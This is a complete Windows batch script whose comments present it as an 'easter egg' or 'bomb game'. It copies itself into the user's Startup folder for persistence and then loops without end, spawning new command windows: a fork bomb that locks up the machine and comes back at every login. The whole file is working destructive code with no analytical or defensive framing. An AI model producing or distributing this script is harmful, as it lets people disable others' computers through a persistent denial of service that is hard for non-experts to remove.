REM Since you opened this file, this is an easter egg of a batch file.
REM And now it turned to a bomb game.

@echo off
set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if not exist "%StartupFolder%\bomb.bat" (
    copy "%~f0" "%StartupFolder%\"
)

:loop
start cmd /k :loop & start cmd & goto loop

goto loop

